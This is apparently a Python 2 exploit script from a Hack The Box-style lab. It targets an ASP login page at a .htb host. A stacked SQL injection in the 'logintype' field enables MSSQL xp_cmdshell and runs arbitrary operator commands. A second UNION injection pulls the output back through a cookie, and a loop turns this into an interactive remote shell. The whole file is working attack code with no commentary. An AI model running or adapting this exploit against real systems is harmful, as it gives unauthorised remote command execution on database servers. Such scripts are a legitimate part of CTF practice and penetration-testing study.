from requests import post
from HTMLParser import HTMLParser

import urllib

def execute(cmd):
    h = HTMLParser()
    params = {"username":"admin","password":"admin","rememberme":"ON","B1":"LogIn","logintype":r"1;EXEC sp_configure 'show advanced options', 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure 'xP_cmDsHell', 1;RECONFIGURE WITH OVERRIDE;drop table #xxx;create table #xxx (out varchar(8000));Insert into #xxx (out) execute xp_CmDShell '{}';EXEC sp_configure 'xp_cmDsHeLl', 0;RECONFIGURE WITH OVERRIDE;".format(cmd)}
    resp = post("http://members.streetfighterclub.htb/old/verify.asp",data=params,allow_redirects=False,cookies={"ASPSESSIONIDCQCSSADD":"IMAKDFFDFHKAKHCDHJEAMMDF"})
    params = {"username":"admin","password":"admin","rememberme":"ON","B1":"LogIn","logintype":r"1 UNION SELECT TOP 1 1,2,3,4,CONVERT(VARBINARY(8000),stuff((select ' ' + d.out from #xxx d where d.out = out order by d.out for xml path('')),1,1,'')),1 FROM #xxx GROUP BY out;"}
    resp = post("http://members.streetfighterclub.htb/old/verify.asp",data=params,allow_redirects=False,cookies={"ASPSESSIONIDCQCSSADD":"IMAKDFFDFHKAKHCDHJEAMMDF"})
    print h.unescape(urllib.unquote(resp.cookies.get('Email')).decode('base64').decode('utf16').replace('          ','').replace('   ','\n'))

while True:
    execute(raw_input('>>'))
